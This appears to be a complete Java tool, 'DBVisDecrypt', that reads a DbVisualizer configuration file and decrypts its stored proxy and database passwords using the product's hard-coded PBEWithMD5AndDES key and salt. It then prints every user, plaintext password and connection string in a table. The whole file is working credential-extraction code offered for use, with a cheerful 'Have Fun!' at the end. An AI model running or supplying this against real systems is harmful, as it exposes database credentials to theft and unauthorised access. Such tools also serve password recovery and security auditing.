import java.nio.charset.StandardCharsets;

import java.util.List;
import java.util.Optional;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.PBEParameterSpec;
 
import java.io.File;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Document;
import org.w3c.dom.Node;

public class DBVisDecrypt {    
    
    /**
     *  Record holding all credentials/info for a database.
     */
	private record Database(String driver, String name, String user, String encrypted_pass, String decrypted_pass, String connection_info) {
 
		public Database(String driver, String name, String user, String encrypted_pass, String decrypted_pass, String connection_info){
			this.driver          = (driver != null          && !driver.equals("")         ) ? driver : "-";
			this.name            = (name != null            && !name.equals("")           ) ? name : "-";
			this.user            = (user != null            && !user.equals("")           ) ? user : "-";
			this.encrypted_pass  = (encrypted_pass != null  && !encrypted_pass.equals("") ) ? encrypted_pass : "-";
			this.decrypted_pass  = (decrypted_pass != null  && !decrypted_pass.equals("") ) ? decrypted_pass : "-";
			this.connection_info = (connection_info != null && !connection_info.equals("")) ? connection_info : "-";
		}
        
        public String toString(List<Integer> max_lengths){
            return " " 
                + this.driver          + " ".repeat(max_lengths.get(0) - this.driver.length() + 1) + "| "
                + this.name            + " ".repeat(max_lengths.get(1) - this.name.length() + 1) + "| "
                + this.user            + " ".repeat(max_lengths.get(2) - this.user.length() + 1) + "| "
                + this.encrypted_pass  + " ".repeat(max_lengths.get(3) - this.encrypted_pass.length() + 1) + "| "
                + this.decrypted_pass  + " ".repeat(max_lengths.get(4) - this.decrypted_pass.length() + 1) + "| "
                + this.connection_info + " ".repeat(max_lengths.get(5) - this.connection_info.length() + 1);
        }
        
	}

    /**
     * Record holding all info for a database connection.
     */
    private record Connection(String database, String server, String port){

        public Connection(String database, String server, String port){
            this.database = database;
            this.server = server;
            this.port = port;
        }

    }

    /**
     * Decrypt password given.
     * @param encrypted_text encrypted password given
     * @return decrypted password 
     */
	private static Optional<String> decrypt(String encrypted_text) {
 
		final byte[] salt = {-114, 18, 57, -100, 7, 114, 111, 90};
		final int iterations = 10;
        byte[] decrypted_bytes = {};
        
        try{
            PBEKeySpec keySpec = new PBEKeySpec("qinda".toCharArray());
            SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("PBEWithMD5AndDES");
            SecretKey key = keyFactory.generateSecret(keySpec);
    
            PBEParameterSpec pbeParamSpec = new PBEParameterSpec(salt, iterations);
            Cipher cipher = Cipher.getInstance("PBEWithMD5AndDES");
            cipher.init( Cipher.DECRYPT_MODE, key, pbeParamSpec );
    
            decrypted_bytes = cipher.doFinal(Base64.getDecoder().decode(encrypted_text));
            String decrypted = new String(decrypted_bytes, StandardCharsets.UTF_8);

            return Optional.of(decrypted);
            
        }catch(Exception e){
            System.err.println("[!] Error decrypting password ("+encrypted_text+")! "+e);
        }

        return Optional.empty();
	}

    /**
     * Extract data for database connections from configuration file.
     * @param config_file configuration file path
     * @return list of database data
     */
	private List<Database> extractDatabases(String config_file) {

        Document document = null;
        List<Database> creds = new ArrayList<Database>();
        creds.add(new Database("Driver","Name","User","Encrypted Password","Decrypted Password","Connection Info"));

        // Global Proxy 

        try{
            File file = new File(config_file);
            DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();
            DocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder();
            document = documentBuilder.parse(file);
        }catch(Exception e){
            System.err.println("[!] Error reading config file ("+config_file+")! "+e);
        }
        
        String driver     = "Proxy";
        String name       = "Default Proxy";
        String proxy_user = document.getElementsByTagName("ProxyUser").item(0).getTextContent();
        String proxy_type = document.getElementsByTagName("ProxyType").item(0).getTextContent();
        String proxy_host = document.getElementsByTagName("ProxyHost").item(0).getTextContent();
        String proxy_port = document.getElementsByTagName("ProxyPort").item(0).getTextContent();
        String conn_info  = String.format("%s://%s:%s", proxy_type, proxy_host, proxy_port);
        String proxy_encr_pass = document.getElementsByTagName("ProxyPassword").item(0).getTextContent();
        String proxy_decr_pass = "";

        if (!proxy_encr_pass.equals("")){
            proxy_decr_pass = decrypt(proxy_encr_pass).get();
        }
        
        creds.add(new Database(driver, name, proxy_user, proxy_encr_pass, proxy_decr_pass, conn_info));
        
        // Individual Databases

        Node dbs = document.getElementsByTagName("Databases").item(0);

        for (Node db = dbs.getFirstChild(); db != null; db = db.getNextSibling()){
            if (db.getNodeName().equals("#text")) continue;

            Optional<Database> cred = getDatabaseInfo(db);
            if (cred.isPresent())
                creds.add(cred.get());
        }

        return creds;
	}

    /**
     * Get database data from configuration file.
     * @param db node "Database" (parent node "Databases") from configuration file
     * @return database data (Alias, Notes, Url, Driver, Driverid, Userid, Profile,...)
     */
    private Optional<Database> getDatabaseInfo(Node db) {

        HashMap<String,String> cred = new HashMap<String,String>();
        for (Node child = db.getFirstChild(); child != null; child = child.getNextSibling()){
            String key = child.getNodeName();
            String value = child.getTextContent().trim();
            if (key != null && !key.equals("#text") && !key.equals("") &&
                value != null && !value.equals("#text") && !value.equals("")) {
                cred.put(key, value);
            }
        }
        String encrypted_pass = cred.get("Password");
        String decrypted_pass = encrypted_pass != null ? decrypt(encrypted_pass).get() : "";

        if (!encrypted_pass.equals("-")){
            String conn_info = cred.get("Url");
            if (conn_info == null){
                Connection url_variables = getConnectionInfo(db);
                conn_info = String.format("%s://%s:%s", url_variables.database(), 
                                                            url_variables.server(), 
                                                            url_variables.port());
            }
            return Optional.of(new Database(cred.get("Driver"), cred.get("Alias"), cred.get("Userid"),
                               encrypted_pass, decrypted_pass, conn_info));
        }
        return Optional.empty(); 
    }

    /**
     * Get database's connection data from configuration file.
     * @param db node "Database" (parent node "Databases") from configuration file
     * @return connection info (Database, Server, Port)
     */
    private Connection getConnectionInfo(Node db) {

        HashMap<String,String> url_variables = new HashMap<String,String>();
        Node url_var_node = getDirectChild(getDirectChild(db,"UrlVariables"),"Driver");
        for (Node child = url_var_node.getFirstChild(); child != null; child = child.getNextSibling()){
            if (child.getNodeName().equals("UrlVariable")) {
                String key = child.getAttributes().getNamedItem("UrlVariableName").getTextContent();
                String value = child.getTextContent().trim();
                url_variables.put(key, value);
            }
        }
        return new Connection(url_variables.get("Database"),
                              url_variables.get("Server"),
                              url_variables.get("Port"));
    }

    /**
     * Get child of node based on child node's name.
     * @param parent parent node
     * @param name child node name
     * @return child node
     */
    private Node getDirectChild(Node parent, String name) {

        for(Node child = parent.getFirstChild(); child != null; child = child.getNextSibling()){
            if(name.equals(child.getNodeName())) return child;
        }
        return null;
    }

    /**
     * Print table with databases' data.
     * @param rows databases list
     */
	private static void printTable(List<Database> rows) {

        List<Integer> column_lengths = new ArrayList<>(Arrays.asList(
            rows.stream().mapToInt(c -> c.driver().length()).max().orElse(0),
            rows.stream().mapToInt(c -> c.name().length()).max().orElse(0),
            rows.stream().mapToInt(c -> c.user().length()).max().orElse(0),
            rows.stream().mapToInt(c -> c.encrypted_pass().length()).max().orElse(0),
            rows.stream().mapToInt(c -> c.decrypted_pass().length()).max().orElse(0),
            rows.stream().mapToInt(c -> c.connection_info().length()).max().orElse(0)
        ));
        
        for (int i = 0; i < rows.size(); i++){
            System.out.println(rows.get(i).toString(column_lengths));
            if (i == 0){
                column_lengths.forEach(length -> System.out.print("-".repeat(length + 2) + "+"));
                System.out.println();
            }
        }
	}

    /**
     * Print Help Menu.
     */
    private static void printHelp(){
        System.out.println("[+] Help menu.\n" +
                           "\tOptions:\n" +
                           "\t-f,-file <value>          Get data and decrypted passwords for every database in DBVis configuration file.\n" +
                           "\t-p,-password <value>      Decrypt specific password.\n"
        );
    }
 
	public static void main(String[] argv) {
 
		System.out.println("[+] DbVisualizer Password Extractor and Decryptor.");
		String dbvis_config = "";
        if (argv[0].equals("-h") || argv[0].equals("-help")){
            printHelp();
            return;
        }
		if (argv.length == 2) {
            if (argv[0].equals("-f") || argv[0].equals("-file")){
                File f = new File(argv[1]);
                if(f.exists() && !f.isDirectory()) {
                    dbvis_config = argv[1];

                    System.out.println("[+] Extracting credentials from \n\t"+dbvis_config);

                    DBVisDecrypt Decryptor = new DBVisDecrypt();
                    printTable(Decryptor.extractDatabases(dbvis_config));

                    System.out.println("\n[+] Done. Have Fun!");
                }else{
                    System.out.println("[+] File \""+argv[1]+"\" doesn't exists.");
                }
            }else if (argv[0].equals("-p") || argv[0].equals("-password")){
                String password = argv[1];
                System.out.println("[+] Decrypting: "+password);
                try{
                    System.out.println("[+] Plain Text: "+decrypt(password).get());
                }catch(Exception e){
                    System.err.println("[!] Error decrypting! "+e);
                }
			}
            return;
		}
        printHelp();	
	}
}